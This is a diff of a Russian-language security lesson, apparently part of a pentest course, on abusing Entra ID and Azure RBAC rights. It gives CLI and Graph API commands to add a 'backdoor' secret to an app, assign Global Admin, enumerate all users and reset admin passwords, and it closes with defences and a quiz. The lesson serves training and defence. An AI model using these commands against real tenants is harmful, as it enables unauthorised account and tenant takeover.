@@ -15,217 +15,196 @@ estimated_minutes: 40
 summary: "Как читать и злоупотреблять правами в Entra ID и Azure RBAC: роли, app permissions, административные unit'ы, гибридные связи с on-prem AD и типовые пути эскалации."
 ---
 
-## Зачем этот урок
+## Вопрос, с которого всё начинается
 
-Azure RBAC и Entra ID дают **две независимые модели прав**, и почти все серьёзные находки рождаются на их стыке. Пользователь с «безобидной» ролью в Entra ID может выдать себе `Owner` на подписку; `Contributor` на VM превращается в доступ к секретам; гибридный аккаунт из on-prem AD синхронизируется в облако и наследует облачные роли.
+В Azure права устроены хитрее, чем в AWS: есть **две** системы — Entra ID (каталог пользователей) и Azure RBAC (права на ресурсы). Одна и та же учётка может быть никем в каталоге, но администратором подписки. Как это читать и где искать эскалацию? Разберём на одном сервис-принципале.
 
-Этот урок — про то, как читать эти права и превращать их в эскалацию.
+## Наш пример: сервис-принципал webapp-sp
 
-## Две модели прав
+Объект урока — сервис-принципал (service principal) `webapp-sp`, у которого есть секрет приложения. Через него мы и будем разбираться с правами.
 
-1. **Azure RBAC** — что можно делать с **ресурсами** (`Microsoft.Compute/*`, `Microsoft.KeyVault/vaults/*`). Роли: `Owner`, `Contributor`, `User Access Administrator`, кастомные.
-2. **Entra ID roles** — что можно делать в **каталоге** (`Global Administrator`, `Application Administrator`, `Privileged Role Administrator`, `User Administrator`). Управляются в Entra ID, не в RBAC.
+## Шаг 1: две системы прав
 
-Плюс третья модель, которую все забывают:
+**Entra ID** (бывший Azure AD) — это каталог: пользователи, группы, приложения. Здесь права дают доступ к «директории» (например, читать всех пользователей через Graph).
 
-3. **Microsoft Graph app permissions** — что может делать **приложение** (`Directory.ReadWrite.All`, `AppRoleAssignment.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`). Секрет такого приложения — почти всегда полный контроль над тенантом.
+**Azure RBAC** — права на ресурсы: подписки, resource groups, отдельные сервисы. Здесь роли вроде `Contributor` назначаются на определённый **scope**.
 
-## Ключевые привилегированные роли и почему они опасны
+Итог: чтобы понять возможности учётки, нужно проверить **обе** системы. Часто бывает так, что в RBAC — `Reader`, а в Entra ID — `Global Reader`, и второе даёт куда больше.
 
-| Роль | Почему критична |
-|------|-----------------|
-| `Global Administrator` | Полный контроль над Entra ID; может выдать любую роль |
-| `Privileged Role Administrator` | Может выдать себе `Global Admin` |
-| `Application Administrator` | Может добавить credentials в **любое** приложение → захватить его права |
-| `Cloud Application Administrator` | То же для облачных приложений |
-| `User Administrator` | Сброс паролей, включая privileged-пользователей |
-| `Authentication Administrator` | Сброс MFA, временных паролей |
-| `Hybrid Identity Administrator` | Может настроить федерацию/синхронизацию → полный захват |
-| `Owner` (RBAC) | Выдать любые RBAC-роли в своём scope |
-| `User Access Administrator` (RBAC) | Управление назначениями ролей |
+## Шаг 2: смотрим назначения Azure RBAC
 
-**Главный приём**: `Application Administrator` не даёт напрямую `Global Admin`, но позволяет **добавить client secret к приложению**, у которого уже есть `Directory.ReadWrite.All` или `RoleManagement.ReadWrite.Directory`. Дальше — от имени приложения выдаём себе админ-роль. Это классический Entra-эскалационный путь.
+Входим под сервис-принципалом и смотрим роли на подписке:
 
-## Service principal и app registration
-
-Приложение (`app registration`) описывает **что** приложение хочет. Service principal — это его **экземпляр в тенанте**, которому выданы роли. Секреты/сертификаты — способ аутентификации.
-
-Атаки на этом слое:
-
-- **Добавить секрет к чужому приложению** (нужны права `Application Administrator` или `owner` приложения):
-  ```bash
-  az ad app credential reset --id <APP_ID> --append --years 1
-  ```
-- **Выдать приложению высокие Graph permissions** и согласовать (admin consent) — если есть `AppRoleAssignment.ReadWrite.All` + `Directory.ReadWrite.All`.
-- **Захватить существующее приложение** с уже согласованными правами — самый тихий путь.
-
-## Инструменты: ROADtools и AzureHound
-
-```bash
-pip install roadtools
-
-# Аутентификация (устройство refresh-токена)
-roadrecon auth -u user@tenant.onmicrosoft.com -p 'Passw0rd!'
-roadrecon gather        # собирает users/groups/apps/roles
-roadrecon gui           # локальный веб-интерфейс для анализа
-
-# AzureHound → граф для BloodHound
-azurehound -u user@tenant.onmicrosoft.com -p 'Passw0rd!' list \
-  --tenant tenant.onmicrosoft.com -o azure.json
+```
+$ az login --service-principal -u c3f1d2e4-... -p 'SECRET' --tenant 72f988bf-...
+$ az role assignment list --assignee c3f1d2e4-... --all --query "[].{role:roleDefinitionName, scope:scope}" -o table
+Role         Scope
+-----------  -------------------------------------------
+Contributor  /subscriptions/11111111-...
 ```
 
-```bash
-# Перечисление ролей и назначений через CLI
-az role assignment list --all -o table
-az ad app list --all -o table
-az ad sp list --all -o table
-az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=999"
+`Contributor` на подписке — это права управлять почти всеми ресурсами (создавать, менять, удалять), кроме назначения ролей. Значит, из `webapp-sp` можно трогать ресурсы продакшена.
+
+## Шаг 3: смотрим права в Entra ID (Graph)
+
+Отдельно проверяем права приложения в каталоге. Они выдаются как **API permissions** (разрешения на Microsoft Graph):
+
+```
+$ az ad app permission list --id c3f1d2e4-...
+[
+  { "resourceAppId": "00000003-0000-0000-c000-000000000000",
+    "resourceAccess": [ { "id": "df021288-...", "type": "Role" } ] }
+]
 ```
 
-## Разобранный пример: от Application Administrator до Global Admin
+Идентификатор `00000003-...` — это Microsoft Graph. Тип `Role` означает **application permission** — право работать без пользователя. Расшифровать конкретное разрешение можно так:
 
-Исходные данные: есть пользователь `alice@corp.onmicrosoft.com` с ролью `Application Administrator` (и пароль к нему).
-
-1. Подтверждаем роль:
-   ```bash
-   az rest --method GET --url "https://graph.microsoft.com/v1.0/me/memberOf"
-   ```
-2. Ищем приложение с уже согласованным `Directory.ReadWrite.All`:
-   ```bash
-   az ad sp list --all --query "[?appRoles!=null]" -o table
-   az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=displayName eq 'Graph Delegated App'"
-   ```
-3. Добавляем себе секрет к этому приложению:
-   ```bash
-   az ad app credential reset --id <APP_ID> --append --display-name backdoor --years 1
-   ```
-4. Аутентифицируемся как это приложение:
-   ```bash
-   az login --service-principal -u <APP_ID> -p '<NEW_SECRET>' --tenant <TID>
-   ```
-5. От имени приложения выдаём `Global Administrator` пользователю `alice`:
-   ```bash
-   az rest --method POST \
-     --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
-     --body '{"principalId":"<ALICE_OBJECT_ID>","roleDefinitionId":"<GLOBAL_ADMIN_ROLE_ID>","directoryScopeId":"/"}'
-   ```
-6. Проверяем — теперь `alice` глобальный админ. Захват завершён.
-
-## Гибридные среды: on-prem AD ↔ Entra ID
-
-В гибридных компаниях Entra ID синхронизируется с on-prem Active Directory через **Entra Connect** (бывш. AAD Connect). Это даёт мощные пути:
-
-- **`Hybrid Identity Administrator`** может настроить **federation** (ADFS/PTA) и тем самым подделать аутентификацию любого пользователя в тенанте.
-- **Синхронизируемые аккаунты**: скомпрометировав on-prem пользователя с облачными ролями, вы получаете и облако.
-- **Аккаунт службы синхронизации (AD DS Connector Account)** имеет `Replicate Directory Changes` в on-prem AD — компрометация этого аккаунта ведёт к DCSync.
-
-Практика: собрав граф AzureHound, ищите «мосты» между on-prem группами и облачными ролями.
-
-## Частые ошибки
-
-- **Игнорировать гостей.** Guest-пользователь с привилегированной ролью — реальная эскалация.
-- **Путать app permission и delegated permission.** Application permissions (app-only) опаснее — они не требуют пользователя в сессии.
-- **Не проверять `owner` приложений.** Владелец app registration может добавить секрет, даже не имея admin-роли в Entra ID.
-- **Забыть про PIM.** Роли в Privileged Identity Management могут быть «eligible» (активируются по запросу) — их не видно в простом `role assignment list`, нужен отдельный анализ.
-- **Считать, что нет прав = нет пути.** Conditional Access, MFA, PIM — это дополнительные двери, а не стены.
-
-## Две модели прав
-
-Entra ID (бывший Azure AD) управляет идентичностями (пользователи, группы, приложения) и ролями каталога (Global Admin, Application Admin). Azure RBAC управляет доступом к ресурсам (Reader, Contributor, Owner) через role assignments на scope (management group/subscription/resource group/resource).
-
-## Опасные роли
-
-| Роль | Почему опасна |
-|------|---------------|
-| Global Administrator | полный контроль каталога |
-| Privileged Role Administrator | выдаёт любые роли |
-| Application Administrator | credentials к приложениям |
-| User Access Administrator | назначает RBAC |
-| Owner (subscription) | всё в подписке |
-| Contributor | создаёт ресурсы, эскалирует |
-
-## Service principal и app registration
-
-App registration имеет credentials (secret/certificate) и API-разрешения. Скомпрометировав secret, вы действуете от имени приложения — часто с широкими правами (например, `Directory.ReadWrite.All`).
-
-## Инструменты: ROADtools и AzureHound
-
-```bash
-roadrecon auth -u user@tenant -p pass
-roadrecon gather
-roadrecon gui
-azurehound -u user -p pass list -o azure.json
-# BloodHound для Azure
+```
+$ az ad sp show --id 00000003-0000-0000-c000-000000000000 \
+    --query "appRoles[?id=='df021288-...'].{name:displayName,value:value}"
+[ { "name": "User.ReadWrite.All", "value": "User.ReadWrite.All" } ]
 ```
 
-## Разобранный пример: от Application Administrator до Global Admin
+`User.ReadWrite.All` — право читать и менять всех пользователей каталога. Это очень серьёзно: можно сбросить пароль админу и войти под ним.
 
-1. Роль `Application Administrator` позволяет добавлять credentials к приложениям.
-2. Находим приложение с ролью `Global Administrator` (или с правами на каталог).
-3. Добавляем свой secret: `az ad app credential reset --id <app-id>`.
-4. Входим как приложение → получаем его права.
-5. Через них выдаём себе Global Admin.
+## Шаг 4: получаем токен по client secret
 
-## Гибридные среды
+Секрет приложения позволяет получить токен на любой ресурс, где у приложения есть права:
 
-AD Connect синхронизирует on-prem AD ↔ Entra ID. Компромисс on-prem AD часто = компромисс Entra ID (например, через `MSOL_`-аккаунт или синхронизируемые привилегированные группы). Проверяйте sync-аккаунты и объекты с `adminCount`.
+```
+$ az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv
+eyJ0eXAiOiJKV1Qi...
+```
 
-## Частые ошибки
+С этим токеном обращаемся к Graph и перечисляем пользователей:
 
-- Игнорировать Entra ID, смотря только на Azure RBAC.
-- Не проверять API-разрешения приложений.
-- Забывать про гибридные пути.
-- Считать `Contributor` безобидным (он эскалирует).
+```
+$ curl -s -H "Authorization: Bearer eyJ0eXAi..." \
+    "https://graph.microsoft.com/v1.0/users?\$select=displayName,userPrincipalName" | head
+{"value":[{"displayName":"Global Admin","userPrincipalName":"admin@acme.onmicrosoft.com"}, ...]}
+```
+
+Мы прочитали весь каталог. Из одного секрета приложения — доступ ко всем пользователям компании.
+
+## Шаг 5: эскалация до полного контроля
+
+С `User.ReadWrite.All` путь прост: сбросить пароль привилегированному пользователю и войти под ним, либо добавить себя в админ-группу. Дальше — назначение роли `Owner` на подписку и полный контроль. Другие типовые пути эскалации в Entra ID:
+
+| Право | Что даёт |
+|-------|----------|
+| `User.ReadWrite.All` | сброс паролей, смена данных пользователей |
+| `AppRoleAssignment.ReadWrite.All` | выдавать приложениям любые права |
+| `Directory.ReadWrite.All` | менять каталог, группы |
+| `RoleManagement.ReadWrite.Directory` | назначать админ-роли |
+
+## Шаг 6: гибридные связи с on-prem AD
+
+Если компания синхронизирует Entra ID с локальным Active Directory (через Entra Connect), появляется мощный вектор. Право `Directory.ReadWrite.All` позволяет изменить атрибуты синхронизируемой учётки — и изменения «утекут» в локальный AD. Так облачный доступ превращается в контроль над доменом. Это одна из самых серьёзных связок в гибридных средах.
+
+## Шаг 7: как искать пути
+
+Порядок такой: войти → посмотреть RBAC-назначения (`az role assignment list`) → посмотреть app permissions в Graph → сверить с таблицей путей. Для автоматизации есть инструменты вроде `AzureHound` и `ROADtools`, которые строят граф прав, как BloodHound для AD.
+
+## Шаг 8: как защищаться
+
+- принцип наименьших привилегий для сервис-принципалов;
+- ограничивать `application` permissions (в отличие от delegated, они работают без пользователя);
+- регулярно проверять секреты приложений и их срок;
+- не давать `User.ReadWrite.All` никому, кроме явно необходимого.
+
+## Шаг 9: административные unit'ы и PIM
+
+Два механизма Azure стоит знать отдельно. **Administrative units** позволяют ограничить админа частью каталога: например, администратор может управлять только пользователями филиала. Если тебе выдали роль в таком unit'е, ты видишь не всех — это ограничивает разведку. **PIM** (Privileged Identity Management) делает роли **активируемыми по требованию**: админ-роль есть, но её нужно «включить» на время, иногда с MFA и обоснованием. Для атакующего PIM означает, что право может быть, но не активно прямо сейчас; иногда роль можно активировать самостоятельно. Для защитника — что даже украденная учётка не даёт мгновенных админ-прав. Оба механизма нужно проверять при оценке Azure-среды.
+
+## Шаг 10: как быстро оценить масштаб
+
+Собери три факта: (1) роли в Azure RBAC на подписке, (2) application permissions в Graph, (3) наличие гибридной синхронизации. Эти три пункта почти полностью определяют, что можно сделать с данной учёткой. Дальше — по таблице путей эскалации. Так за несколько команд ты понимаешь и доступ к ресурсам, и доступ к каталогу.
+
+## Практический совет
+
+Проверяй обе системы прав сразу: пропустишь Graph — не увидишь половину возможностей учётки. Начни с `az role assignment list` и `az ad app permission list`.
+
+## Частые вопросы
+
+**«Чем Entra ID отличается от Azure RBAC?»** Entra ID — каталог (пользователи, приложения), RBAC — права на ресурсы. Это две разные системы.
+
+**«Почему роль Contributor на подписке так много даёт?»** Она позволяет управлять почти всеми ресурсами: создавать, менять и удалять их.
+
+**«Что опаснее — роль на ресурс или право в Graph?»** Часто право в Graph: `User.ReadWrite.All` позволяет сбросить пароль админу и войти под ним.
+
+**«Как читать application permissions?»** По идентификатору ресурса и роли: `00000003-...` — это Graph, а `Role` — работа без пользователя.
+
+## Что мы теперь знаем
+
+По-простому:
+
+1. В Azure две системы прав: Entra ID и Azure RBAC.
+2. RBAC назначает роли на scope ресурсов.
+3. API permissions в Graph дают доступ к каталогу.
+4. `User.ReadWrite.All` позволяет сбросить пароль админа.
+5. Гибридная синхронизация связывает облако с локальным AD.
+
+## На что смотреть дальше
+
+- **Проверяй обе системы.** Каталог и ресурсы — разные права.
+- **Ищи application permissions.** Они не требуют пользователя.
+- **Смотри секреты приложений.** Долгоживущий секрет — риск.
+- **Помни про гибрид.** Облачный доступ может дотянуться до домена.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Почему роль Application Administrator в Entra ID может вести к полному контролю тенанта?"
+- question: "Какие две системы прав есть в Azure?"
   options:
-    - "Она даёт доступ к биллингу"
-    - "Она позволяет добавить секрет к любому приложению, включая приложения с высокими Graph permissions"
-    - "Она автоматически выдаёт Global Administrator"
-    - "Она даёт root на все VM"
-  answer: 1
-  explanation: "Добавив credential чужому приложению с высокими правами, вы действуете от его имени — тихая эскалация."
-- question: "Какая команда добавляет новый client secret к app registration?"
+    - "Entra ID (каталог) и Azure RBAC (ресурсы)"
+    - "IAM и KMS"
+    - "S3 и EC2"
+    - "DNS и CDN"
+  answer: 0
+  explanation: "Каталог и ресурсы управляются по-разному."
+- question: "На что назначается роль в Azure RBAC?"
   options:
-    - "az ad sp create-for-rbac"
-    - "az ad app credential reset --id <APP_ID> --append"
-    - "az role assignment create"
-    - "az login --service-principal"
-  answer: 1
-  explanation: "credential reset с --append добавляет новый секрет, не удаляя существующие."
-- question: "Чем application permission (app-only) опаснее delegated permission?"
+    - "На scope: подписку, resource group или ресурс"
+    - "На пользователя ОС"
+    - "На бакет"
+    - "На регион DNS"
+  answer: 0
+  explanation: "Scope определяет область действия роли."
+- question: "Что означает тип Role (application permission) в Graph?"
   options:
-    - "Он требует MFA"
-    - "Он действует без пользовательской сессии — приложение обращается к Graph само"
-    - "Он только для чтения"
-    - "Он не даёт прав"
-  answer: 1
-  explanation: "App-only permissions не привязаны к вошедшему пользователю — захват приложения сразу даёт его права."
-- question: "Какой облачный администратор может настроить федерацию и тем самым подделать вход любого пользователя?"
+    - "Приложение работает без пользователя, со своими правами"
+    - "Право только для чтения"
+    - "Требуется MFA"
+    - "Право истекает за час"
+  answer: 0
+  explanation: "Application permissions не зависят от пользователя."
+- question: "Какое право позволяет сбросить пароль любому пользователю?"
   options:
-    - "User Administrator"
-    - "Hybrid Identity Administrator"
+    - "User.ReadWrite.All"
+    - "s3:GetObject"
+    - "Contributor"
     - "Reader"
-    - "Storage Blob Data Owner"
-  answer: 1
-  explanation: "Hybrid Identity Administrator управляет синхронизацией и федерацией — это прямой путь к захвату аутентификации."
-- question: "Почему роли в PIM могут быть не видны в простом списке role assignment?"
+  answer: 0
+  explanation: "Оно даёт менять данные всех пользователей каталога."
+- question: "Чем опасна гибридная синхронизация с AD?"
   options:
-    - "PIM скрывает все роли навсегда"
-    - "Роли могут быть eligible и активируются только по запросу"
-    - "PIM работает только в AWS"
-    - "PIM удаляет роли"
-  answer: 1
-  explanation: "Eligible-роли активируются по требованию, поэтому в активных назначениях их нет."
+    - "Изменения в облаке могут утечь в локальный домен"
+    - "Она ускоряет вход"
+    - "Она шифрует пароли"
+    - "Она отключает RBAC"
+  answer: 0
+  explanation: "Через синхронизацию облачный доступ дотягивается до домена."
 ```
+
+## Куда дальше
+
+Мы разобрали Azure. Дальше — **GCP**: сервисные аккаунты и имперсонация, где права «примерить» другую личность выражаются явным permission. А пока запомни главное: в Azure смотри обе системы прав, а права приложения в Graph часто опаснее ролей на ресурсы.
 
 ## Где пригодится
 
-- **Пентест Azure/Entra ID** — основа эскалации в Microsoft-облаке.
-- **Red team** — пути от пользователя к Global Admin.
-- **IR/Blue team** — детект добавления секретов к приложениям и выдачи ролей.
-- **Bug bounty** — программы Microsoft и корпоративные тенанты.
-- **Сертификации** — SC-300, AZ-500.
+- **CTF (Cloud):** Azure-задачи с сервис-принципалами.
+- **Bug bounty:** over-permissive app registrations.
+- **Пентест:** аудит RBAC и Graph permissions.
+- **Blue team:** минимизация application permissions и ротация секретов.
